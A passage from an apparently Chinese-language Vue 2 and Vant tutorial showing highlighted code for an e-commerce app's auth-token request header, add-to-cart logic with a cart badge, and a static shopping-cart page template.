class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">token</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">store</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">getters</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">token</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">token</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">config</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">headers</span><span style="color: #D4D4D4">[</span><span style="color: #CE9178">"Access-Token"</span><span style="color: #D4D4D4">] = </span><span style="color: #9CDCFE">token</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">config</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">headers</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">platform</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"h5"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">config</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><p>修改购物车渲染代码进行购物车内数量角标展示 <code>views/productdetail/index.vue</code></p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"icon-cart"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        &lt;van-icon :badge="cartTotal || ''" name="shopping-cart-o" /&gt;</span></span><span class="line"><span style="color: #D4D4D4">        &lt;span&gt;购物车&lt;/span&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>导入并将商品规格赋值给 data 数据</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">addCart</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">'@/api/cart'</span></span><span class="line"><span style="color: #D4D4D4">...</span></span><span class="line"></span><span class="line"><span style="color: #9CDCFE">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">created</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 获取商品详情-说明部分</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">goodsId</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">detailId</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">res</span><span style="color: #D4D4D4"> = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getGoodsDetail</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">goodsId</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// console.log(res)</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goodsDetailObj</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">res</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">detail</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// console.log(this.goodsDetailObj)</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goodsSkuId</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goodsDetailObj</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">skuList</span><span style="color: #D4D4D4">[</span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">].</span><span style="color: #9CDCFE">goods_sku_id</span><span style="color: #D4D4D4"> </span><span style="color: #6A9955">// 得到商品规格id</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">images</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goodsDetailObj</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goods_images</span><span style="color: #D4D4D4"> </span><span style="color: #6A9955">// 得到商品轮播图</span></span><span class="line"><span style="color: #D4D4D4">...</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p>提供 data 数据来接收必要信息</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C8C8C8">addCount</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 加入购物车的商品数量</span></span><span class="line"><span style="color: #C8C8C8">goodsSkuId</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 商品规格id</span></span><span class="line"><span style="color: #C8C8C8">cartTotal</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 购物车内商品总数</span></span></code></pre></div></div></figure><p>编写请求代码</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 加入购物车判断登录状态</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">async</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">addCart</span><span style="color: #D4D4D4"> () {</span></span><span class="line"><span style="color: #D4D4D4">      ...</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// 说明有token，可以直接加入购物车</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> { </span><span style="color: #4FC1FF">data</span><span style="color: #D4D4D4"> } = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">addCart</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">detailId</span><span style="color: #D4D4D4">, </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addCount</span><span style="color: #D4D4D4">, </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">goodsSkuId</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cartTotal</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">cartTotal</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">$toast</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'加入购物车成功！'</span><span style="color: #D4D4D4">)</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">showPannel</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">false</span><span style="color: #D4D4D4"> </span><span style="color: #6A9955">// 关闭弹层</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span></code></pre></div></div></figure><h2 id="购物车页面"><a class="markdownIt-Anchor" href="#购物车页面"></a> 购物车页面</h2><p>需求分析：</p><ol><li>基本静态结构 (快速实现）</li><li>构建 vuexcart 模块，获取数据存储</li><li>基于数据居动态渲染购物车列表</li><li>封装 getters 实现动态统计</li><li>全选反选功能</li><li>数字框修改数量功能</li><li>编辑切换状态，删除功能</li><li>空购物车处理</li></ol><h3 id="静态页面"><a class="markdownIt-Anchor" href="#静态页面"></a> 静态页面</h3><p>修改 <code>layout/cart.vue</code></p><p>使用到了 vant 的 Checkbox, CheckboxGroup 组件</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #C586C0">import</span><span style="color: #D4D4D4"> { </span><span style="color: #9CDCFE">Checkbox</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">CheckboxGroup</span><span style="color: #D4D4D4"> } </span><span style="color: #C586C0">from</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">"vant"</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #9CDCFE">Vue</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">use</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">Checkbox</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">Vue</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">use</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">CheckboxGroup</span><span style="color: #D4D4D4">);</span></span></code></pre></div></div></figure><p>静态页面如下：</p><figure class="shiki vue"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"cart"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-nav-bar</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">title</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"购物车"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">fixed</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 购物车开头 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"cart-title"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"all"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">共</span><span style="color: #808080">&lt;</span><span style="color: #569CD6">i</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">4</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">i</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">件商品</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"edit"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-icon</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">name</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"edit"</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        编辑</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">&lt;!-- 购物车列表 --&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"cart-list"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"cart-item"</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-for</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">in</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">10</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> :</span><span style="color: #9CDCFE">key</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #9CDCFE">item</span><span style="color: #D4D4D4">"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-checkbox</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #569CD6">van-checkbox</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"show"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">img</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">src</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"http://cba.itlike.com/public/uploads/10001/20230321/a072ef0eef1648a5c4eae81fad1b7583.jpg"</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">alt</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">""</span></span><span class="line"><span style="color: #D4D4D4">          /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"info"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"tit text-ellipsis-2"</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">新Pad 14英寸 12+128 远峰蓝 M6平板电脑</span></span><span class="line"><span style="color: #D4D4D4">            智能安卓娱乐十核游戏学习二合一</span></span><span class="line"><span style="color: #D4D4D4">            低蓝光护眼超清4K全面三星屏5GWIFI全网通 蓝魔快本平板</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"bottom"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"price"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">¥ </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">1247.04</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"count-box"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">              </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">button</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"minus"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">-</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">button</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">              </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">input</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"inp"</span><span style="color: #D4D4D4"> :</span><span style="color: #9CDCFE">value</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #B5CEA8">4</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">type</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"text"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">readonly</span><span style="color: #D4D4D4"> /</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">              </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">button</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"add"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">+</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">button</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"footer-fixed"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"all-check"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">van-checkbox</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">icon-size</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"18"</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #569CD6">van-checkbox</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        全选</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"all-total"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"price"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">合计：</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">¥ </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">i</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"totalPrice"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">99.99</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">i</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #569CD6">span</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-if</span><span style="color: #D4D4D4">=</span><span style="color: #D4D4D4">"</span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"goPay"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">结算(5)</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">div</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">v-else</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"delete"</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">删除</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">div</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">template</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">script</span><span style="color: 